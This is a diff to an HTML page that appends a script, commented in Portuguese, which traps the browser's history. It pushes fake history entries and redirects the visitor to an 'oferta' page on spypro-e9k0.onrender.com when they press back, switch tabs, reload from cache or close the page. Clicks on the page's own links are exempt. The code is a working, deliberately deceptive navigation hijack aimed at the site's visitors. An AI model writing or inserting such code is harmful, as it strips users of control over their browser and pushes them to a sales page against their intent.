@@ -557,5 +557,63 @@ window.addEventListener("beforeunload", () => {
 });
 </script>
 
+
+<script>
+(function () {
+  const BACK_URL = "https://spypro-e9k0.onrender.com/oferta"; // <-- LINK DA PÁGINA DE BACK REDIRECT
+
+  let armed = true;
+  let navigating = false;
+
+  // Detecta clique em qualquer link
+  document.addEventListener("click", function (e) {
+    const a = e.target.closest("a");
+    if (a && a.href) {
+      navigating = true;
+      armed = false;
+      setTimeout(() => { navigating = false; armed = true; }, 1500);
+    }
+  }, true);
+
+  // Arma a armadilha no histórico
+  function trapHistory() {
+    try { history.pushState({}, "", location.href); } catch(e) {}
+  }
+  trapHistory();
+  setTimeout(trapHistory, 60);
+
+  // Quando o cara tentar voltar
+  window.addEventListener("popstate", function () {
+    if (armed) {
+      location.replace(BACK_URL);
+    } else {
+      setTimeout(trapHistory, 100);
+    }
+  });
+
+  // Se sair da aba
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden" && armed && !navigating) {
+      location.replace(BACK_URL);
+    }
+  });
+
+  // Se recarregar com cache (mobile)
+  window.addEventListener("pageshow", function (e) {
+    if (e.persisted && armed && !navigating) {
+      location.replace(BACK_URL);
+    }
+  });
+
+  // Se fechar a página (Safari & Mobile)
+  window.addEventListener("pagehide", function () {
+    if (armed && !navigating) {
+      location.replace(BACK_URL);
+    }
+  });
+})();
+</script>
+
+    
 </body>
 </html>
